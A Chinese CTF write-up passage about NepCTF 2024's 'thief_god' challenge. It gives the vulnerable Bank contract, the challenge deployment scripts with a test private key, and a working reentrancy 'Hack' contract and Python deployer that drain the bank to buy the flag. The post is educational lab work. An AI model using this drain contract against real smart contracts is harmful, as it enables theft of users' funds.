        <content type="html"><![CDATA[<blockquote><p>由于是同一个比赛，writeup和复现就放在同一篇文章里了</p></blockquote><h2 id="Writeup部分"><a href="#Writeup部分" class="headerlink" title="Writeup部分"></a>Writeup部分</h2><h4 id="Writeup"><a href="#Writeup" class="headerlink" title="Writeup"></a><a href="https://www.blog.st4rr.top/writeups/NepCTF2024Writeup.pdf">Writeup</a></h4><h2 id="复现部分"><a href="#复现部分" class="headerlink" title="复现部分"></a>复现部分</h2><h3 id="Blockchain"><a href="#Blockchain" class="headerlink" title="Blockchain"></a>Blockchain</h3><h4 id="thief-god"><a href="#thief-god" class="headerlink" title="thief_god"></a>thief_god</h4><blockquote><p>本题中使用的是智能合约安全中的重入攻击，看网上说这已经是很基础的东西了，结果我比赛时弄了大半天都没弄明白。。。该找个时间好好学学区块链了。。。</p></blockquote><h5 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h5><p>1.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> web3 <span class="keyword">import</span> Web3</span><br><span class="line"><span class="keyword">from</span> solcx <span class="keyword">import</span> compile_source, install_solc</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="comment"># 安装特定版本的solc</span></span><br><span class="line">install_solc(<span class="string">&#x27;0.8.26&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 启动Hardhat节点并将输出重定向到文件</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;hardhat_node_output.txt&quot;</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> outfile:</span><br><span class="line">    node_process = subprocess.Popen(</span><br><span class="line">        [<span class="string">&quot;npx&quot;</span>, <span class="string">&quot;hardhat&quot;</span>, <span class="string">&quot;node&quot;</span>, <span class="string">&quot;--hostname&quot;</span>, <span class="string">&quot;0.0.0.0&quot;</span>],</span><br><span class="line">        stdout=outfile,</span><br><span class="line">        stderr=subprocess.PIPE,</span><br><span class="line">        text=<span class="literal">True</span></span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">time.sleep(<span class="number">30</span>)  <span class="comment"># 等待节点启动</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 读取节点输出以获取账户信息</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;hardhat_node_output.txt&quot;</span>, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> infile:</span><br><span class="line">    output = infile.read()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 解析Hardhat节点的输出以获取账户信息</span></span><br><span class="line">accounts = re.findall(<span class="string">r&#x27;0x[a-fA-F0-9]&#123;40&#125;&#x27;</span>, output)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(accounts) &lt; <span class="number">2</span>:</span><br><span class="line">    node_process.kill()</span><br><span class="line">    <span class="keyword">raise</span> Exception(<span class="string">&quot;无法获取足够的账户信息&quot;</span>)</span><br><span class="line"></span><br><span class="line">deployer_account_address = accounts[<span class="number">0</span>]</span><br><span class="line">attacker_account_address = accounts[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用默认私钥初始化Web3实例</span></span><br><span class="line">w3 = Web3(Web3.HTTPProvider(<span class="string">&#x27;http://127.0.0.1:8545&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 确保连接成功</span></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> w3.is_connected():</span><br><span class="line">    node_process.kill()</span><br><span class="line">    <span class="keyword">raise</span> Exception(<span class="string">&quot;无法连接到以太坊节点&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置部署者和攻击者账户的私钥</span></span><br><span class="line">deployer_private_key = <span class="string">&quot;&quot;</span></span><br><span class="line">attacker_private_key = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">deployer_account = &#123;</span><br><span class="line">    <span class="string">&quot;address&quot;</span>: deployer_account_address,</span><br><span class="line">    <span class="string">&quot;private_key&quot;</span>: deployer_private_key</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">attacker_account = &#123;</span><br><span class="line">    <span class="string">&quot;address&quot;</span>: attacker_account_address,</span><br><span class="line">    <span class="string">&quot;private_key&quot;</span>: attacker_private_key</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Solidity合约代码</span></span><br><span class="line">solidity_code = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">// SPDX-License-Identifier: MIT</span></span><br><span class="line"><span class="string">pragma solidity ^0.8.0;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">contract Bank &#123;</span></span><br><span class="line"><span class="string">    mapping(address =&gt; uint256) public balanceOf;</span></span><br><span class="line"><span class="string">    string private flag;</span></span><br><span class="line"><span class="string">    uint256 public flagPrice = 50 ether;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    // 事件日志</span></span><br><span class="line"><span class="string">    event Deposit(address indexed user, uint256 amount);</span></span><br><span class="line"><span class="string">    event Withdraw(address indexed user, uint256 amount);</span></span><br><span class="line"><span class="string">    event TransferFailed(address indexed user, uint256 amount);</span></span><br><span class="line"><span class="string">    event FlagPurchased(address indexed buyer, string flag);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    constructor(string memory _flag) &#123;</span></span><br><span class="line"><span class="string">        flag = _flag;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    // 存入ether，并更新余额</span></span><br><span class="line"><span class="string">    function deposit() external payable &#123;</span></span><br><span class="line"><span class="string">        balanceOf[msg.sender] += msg.value;</span></span><br><span class="line"><span class="string">        emit Deposit(msg.sender, msg.value);</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">     // 提取msg.sender的全部ether</span></span><br><span class="line"><span class="string">    function withdraw() external &#123;</span></span><br><span class="line"><span class="string">        uint256 balance = balanceOf[msg.sender]; // 获取余额</span></span><br><span class="line"><span class="string">        require(balance &gt; 0, &quot;Insufficient balance&quot;);</span></span><br><span class="line"><span class="string">        (bool success, ) = msg.sender.call&#123;value: balance&#125;(&quot;&quot;);</span></span><br><span class="line"><span class="string">        require(success, &quot;Failed to send Ether&quot;);</span></span><br><span class="line"><span class="string">        // 更新余额</span></span><br><span class="line"><span class="string">        balanceOf[msg.sender] = 0;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    // 获取银行合约的余额</span></span><br><span class="line"><span class="string">    function getBalance() external view returns (uint256) &#123;</span></span><br><span class="line"><span class="string">        return address(this).balance;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    // 获取flag</span></span><br><span class="line"><span class="string">    function getFlag() external view returns (string memory) &#123;</span></span><br><span class="line"><span class="string">        require(balanceOf[msg.sender] &gt;= flagPrice, &quot;Insufficient balance to get flag&quot;);</span></span><br><span class="line"><span class="string">        return flag;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 编译Solidity合约</span></span><br><span class="line">compiled_sol = compile_source(solidity_code)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 从编译后的内容中获取正确的键值</span></span><br><span class="line">contract_id, contract_interface = compiled_sol.popitem()</span><br><span class="line"><span class="comment"># 创建合约对象</span></span><br><span class="line">Bank = w3.eth.contract(abi=contract_interface[<span class="string">&#x27;abi&#x27;</span>], bytecode=contract_interface[<span class="string">&#x27;bin&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 构造交易</span></span><br><span class="line">nonce = w3.eth.get_transaction_count(deployer_account[<span class="string">&quot;address&quot;</span>])</span><br><span class="line"></span><br><span class="line">T=<span class="number">0</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_flag</span>():</span><br><span class="line">    <span class="keyword">while</span> T&lt;<span class="number">200</span>:</span><br><span class="line">        flag = os.getenv(<span class="string">&#x27;GZCTF_FLAG&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> flag <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span> flag</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Environment variable &#x27;GZCTF_FLAG&#x27; is not set. Waiting for 1 minute...&quot;</span>)</span><br><span class="line">        time.sleep(<span class="number">1</span>)  <span class="comment"># Wait for 1 minute</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Retrieve the flag</span></span><br><span class="line">flag = get_flag()</span><br><span class="line"></span><br><span class="line"><span class="comment"># Create the transaction using the flag from the environment variable</span></span><br><span class="line">transaction = Bank.constructor(flag).build_transaction(&#123;</span><br><span class="line">    <span class="string">&#x27;chainId&#x27;</span>: <span class="number">31337</span>,</span><br><span class="line">    <span class="string">&#x27;gas&#x27;</span>: <span class="number">2000000</span>,</span><br><span class="line">    <span class="string">&#x27;gasPrice&#x27;</span>: w3.to_wei(<span class="string">&#x27;50&#x27;</span>, <span class="string">&#x27;gwei&#x27;</span>),</span><br><span class="line">    <span class="string">&#x27;nonce&#x27;</span>: nonce,</span><br><span class="line">&#125;)</span><br><span class="line"><span class="comment"># 签署交易</span></span><br><span class="line">signed_txn = w3.eth.account.sign_transaction(transaction, private_key=deployer_account[<span class="string">&quot;private_key&quot;</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 发送交易</span></span><br><span class="line">tx_hash = w3.eth.send_raw_transaction(signed_txn.rawTransaction)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取交易回执</span></span><br><span class="line">tx_receipt = w3.eth.wait_for_transaction_receipt(tx_hash)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出合约地址和ABI</span></span><br><span class="line">bank_contract_address = tx_receipt.contractAddress</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;Bank合约部署成功，地址为: <span class="subst">&#123;bank_contract_address&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;Bank合约ABI: <span class="subst">&#123;contract_interface[<span class="string">&quot;abi&quot;</span>]&#125;</span>&#x27;</span>)</span><br><span class="line">time.sleep(<span class="number">2</span>)</span><br><span class="line">subprocess.Popen([<span class="string">&quot;python3&quot;</span>, <span class="string">&quot;2.py&quot;</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">start_tcp_server</span>(<span class="params">host, port, message</span>):</span><br><span class="line">    <span class="keyword">with</span> socket.socket(socket.AF_INET, socket.SOCK_STREAM) <span class="keyword">as</span> s:</span><br><span class="line">        s.bind((host, port))</span><br><span class="line">        s.listen()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Listening on <span class="subst">&#123;host&#125;</span>:<span class="subst">&#123;port&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            conn, addr = s.accept()</span><br><span class="line">            <span class="keyword">with</span> conn:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;Connected by <span class="subst">&#123;addr&#125;</span>&quot;</span>)</span><br><span class="line">                conn.sendall(message.encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">message = <span class="string">f&quot;Bank合约部署成功，地址与测试账号私钥为: <span class="subst">&#123;bank_contract_address&#125;</span> <span class="subst">&#123;attacker_account[<span class="string">&#x27;private_key&#x27;</span>]&#125;</span>\n&quot;</span></span><br><span class="line">start_tcp_server(<span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="number">65432</span>, message)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>hardcat.config.js</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">require</span>(<span class="string">&quot;@nomicfoundation/hardhat-toolbox&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/** <span class="doctag">@type</span> import(&#x27;hardhat/config&#x27;).HardhatUserConfig */</span></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = &#123;</span><br><span class="line">  <span class="attr">solidity</span>: <span class="string">&quot;0.8.26&quot;</span>,</span><br><span class="line">  <span class="attr">networks</span>: &#123;</span><br><span class="line">    <span class="attr">hardhat</span>: &#123;</span><br><span class="line">      <span class="attr">accounts</span>: [</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">privateKey</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">          <span class="attr">balance</span>: <span class="string">&quot;20000000000000000000000&quot;</span>  </span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">privateKey</span>: <span class="string">&quot;0x4b609fde92771ee750dac4d0aace6c9cf34e341229dbda382e49c492ad206e5e&quot;</span>,<span class="comment">//attacker</span></span><br><span class="line">          <span class="attr">balance</span>: <span class="string">&quot;10000000000000000000&quot;</span>  </span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">privateKey</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">          <span class="attr">balance</span>: <span class="string">&quot;10000000000000000000000&quot;</span> </span><br><span class="line">        &#125;</span><br><span class="line">      ]</span><br><span class="line">&#125;,</span><br><span class="line">    <span class="attr">localhost</span>: &#123;</span><br><span class="line">      <span class="attr">url</span>: <span class="string">&quot;http://127.0.0.1:8545&quot;</span>,</span><br><span class="line">      <span class="comment">// 本地网络通常不需要配置账户</span></span><br><span class="line">    &#125;,</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">defaultNetwork</span>: <span class="string">&quot;localhost&quot;</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>地址获取脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> web3 <span class="keyword">import</span> Web3</span><br><span class="line"></span><br><span class="line"><span class="comment"># 连接到本地节点</span></span><br><span class="line">web3 = Web3(Web3.HTTPProvider(<span class="string">&quot;https://neptune-xxxxx.nepctf.lemonprefect.cn&quot;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义一个函数来扫描区块链并查找合约创建交易</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_contract_addresses</span>(<span class="params">start_block, end_block</span>):</span><br><span class="line">    contract_addresses = []</span><br><span class="line">    <span class="keyword">for</span> block_number <span class="keyword">in</span> <span class="built_in">range</span>(start_block, end_block + <span class="number">1</span>):</span><br><span class="line">        block = web3.eth.get_block(block_number, full_transactions=<span class="literal">True</span>)</span><br><span class="line">        <span class="keyword">for</span> tx <span class="keyword">in</span> block.transactions:</span><br><span class="line">            <span class="keyword">if</span> tx.to <span class="keyword">is</span> <span class="literal">None</span>:  </span><br><span class="line">                receipt = web3.eth.get_transaction_receipt(tx.<span class="built_in">hash</span>)</span><br><span class="line">                contract_addresses.append(receipt.contractAddress)</span><br><span class="line">    <span class="keyword">return</span> contract_addresses</span><br><span class="line"></span><br><span class="line"><span class="comment"># 扫描区块范围</span></span><br><span class="line">start_block = <span class="number">0</span>  <span class="comment"># 起始区块</span></span><br><span class="line">end_block = web3.eth.block_number  <span class="comment"># 当前最新区块</span></span><br><span class="line">contracts = find_contract_addresses(start_block, end_block)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Deployed contract addresses:&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> address <span class="keyword">in</span> contracts:</span><br><span class="line">    <span class="built_in">print</span>(address)</span><br></pre></td></tr></table></figure><h5 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h5><p>阅读代码，大部分是展示了题目的部署，有用的信息是智能合约的代码和给出的攻击者的privatekey。直接在metamask中用privatekey导入账户即可得到攻击者账户的地址0x2eca396F5474202720C4561c06ABcc0Bdd186E2c。</p><p><img src="/images/NepCTF2024-Writeup/image-20240827000351346.png" alt="image-20240827000351346"></p><p>然后用题目所给的脚本扫一下找到题目部署的合约地址</p><p><img src="/images/NepCTF2024-Writeup/image-20240827000642428.png" alt="image-20240827000642428"></p><p>这样就做完了前期的准备工作。</p><p>接下来就是重入攻击，先放个<a href="https://mp.weixin.qq.com/s/4j5_CirSySE1GLd3BP9CZQ">传送门</a>在这。</p><p>阅读题目中给出的合约代码，合约实现了向“银行”存、取、查以及getFlag的操作，银行中本来有50 ether。根据重入攻击，我们要做的是在从“银行”中取钱时触发一个fallback函数，使得能从“银行”中一直取钱，直到”银行“中的钱小于1 ether。据此可以编写如下合约：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">interface Bank &#123;</span><br><span class="line">    function deposit() external payable;</span><br><span class="line">    function withdraw() external;</span><br><span class="line">    function getBalance() external view returns (uint256);</span><br><span class="line">    function getFlag() external view returns (string memory);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Hack &#123;</span><br><span class="line">    Bank public etherStore;</span><br><span class="line">    string public flag;</span><br><span class="line"></span><br><span class="line">    constructor(address _etherStoreAddress) &#123;</span><br><span class="line">        etherStore = Bank(_etherStoreAddress);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fallback() external payable &#123;</span><br><span class="line">        if (address(etherStore).balance &gt;= 1 ether) &#123;</span><br><span class="line">            etherStore.withdraw();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack() external payable &#123;</span><br><span class="line">        etherStore.deposit&#123;value: msg.value&#125;();</span><br><span class="line">        etherStore.withdraw();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function getflag() external &#123;</span><br><span class="line">        etherStore.deposit&#123;value: address(this).balance&#125;();</span><br><span class="line">        flag = etherStore.getFlag();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>部署的代码直接抄题目中的即可，输出我们的合约部署的地址和abi</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> web3 <span class="keyword">import</span> Web3</span><br><span class="line"><span class="keyword">from</span> solcx <span class="keyword">import</span> compile_source, install_solc</span><br><span class="line">install_solc(<span class="string">&#x27;0.8.26&#x27;</span>)</span><br><span class="line">w3 = Web3(Web3.HTTPProvider(<span class="string">&quot;https://neptune-43115.nepctf.lemonprefect.cn&quot;</span>))</span><br><span class="line">solidity_code =<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">// SPDX-License-Identifier: MIT</span></span><br><span class="line"><span class="string">pragma solidity ^0.8.0;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">interface Bank &#123;</span></span><br><span class="line"><span class="string">    function deposit() external payable;</span></span><br><span class="line"><span class="string">    function withdraw() external;</span></span><br><span class="line"><span class="string">    function getBalance() external view returns (uint256);</span></span><br><span class="line"><span class="string">    function getFlag() external view returns (string memory);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">contract Hack &#123;</span></span><br><span class="line"><span class="string">    Bank public etherStore;</span></span><br><span class="line"><span class="string">    string public flag;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    constructor(address _etherStoreAddress) &#123;</span></span><br><span class="line"><span class="string">        etherStore = Bank(_etherStoreAddress);</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    fallback() external payable &#123;</span></span><br><span class="line"><span class="string">        if (address(etherStore).balance &gt;= 1 ether) &#123;</span></span><br><span class="line"><span class="string">            etherStore.withdraw();</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    function attack() external payable &#123;</span></span><br><span class="line"><span class="string">        etherStore.deposit&#123;value: msg.value&#125;();</span></span><br><span class="line"><span class="string">        etherStore.withdraw();</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    function getflag() external &#123;</span></span><br><span class="line"><span class="string">        etherStore.deposit&#123;value: address(this).balance&#125;();</span></span><br><span class="line"><span class="string">        flag = etherStore.getFlag();</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">compiled_sol = compile_source(solidity_code)</span><br><span class="line">contract_id, contract_interface = compiled_sol.popitem()</span><br><span class="line">Bank = w3.eth.contract(</span><br><span class="line">    abi=contract_interface[<span class="string">&#x27;abi&#x27;</span>], bytecode=contract_interface[<span class="string">&#x27;bin&#x27;</span>])</span><br><span class="line">nonce = w3.eth.get_transaction_count(<span class="string">&quot;0x2eca396F5474202720C4561c06ABcc0Bdd186E2c&quot;</span>)</span><br><span class="line">transaction = Bank.constructor(<span class="string">&quot;0xA86Cb9aCABb3E6629a47d676BEB38e2455B20917&quot;</span>).build_transaction(&#123;</span><br><span class="line">    <span class="string">&#x27;chainId&#x27;</span>: <span class="number">31337</span>,</span><br><span class="line">    <span class="string">&#x27;gas&#x27;</span>: <span class="number">2000000</span>,</span><br><span class="line">    <span class="string">&#x27;gasPrice&#x27;</span>: w3.to_wei(<span class="string">&#x27;50&#x27;</span>, <span class="string">&#x27;gwei&#x27;</span>),</span><br><span class="line">    <span class="string">&#x27;nonce&#x27;</span>: nonce,</span><br><span class="line">&#125;)</span><br><span class="line">signed_txn = w3.eth.account.sign_transaction(</span><br><span class="line">    transaction, private_key=<span class="string">&quot;0x4b609fde92771ee750dac4d0aace6c9cf34e341229dbda382e49c492ad206e5e&quot;</span>)</span><br><span class="line">tx_hash = w3.eth.send_raw_transaction(signed_txn.rawTransaction)</span><br><span class="line">tx_receipt = w3.eth.wait_for_transaction_receipt(tx_hash)</span><br><span class="line">bank_contract_address = tx_receipt.contractAddress</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;Bank合约部署成功，地址为: <span 